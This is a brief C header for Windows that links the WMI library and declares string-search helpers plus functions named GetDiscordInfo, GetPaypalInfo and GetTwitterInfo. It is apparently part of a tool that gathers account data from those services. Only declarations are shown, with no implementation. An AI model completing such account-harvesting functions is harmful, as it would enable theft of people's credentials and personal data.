#include <Windows.h>
#pragma comment(lib, "wbemuuid.lib")

char* FindStringOffset(char* text, const char* str, int size);
void GetInfo(char* txt, char* info, const char* stop);
void GetDiscordInfo(char* info, int infoSize);
void GetPaypalInfo(char* info, int infoSize);
void GetTwitterInfo(char* info, int infoSize);
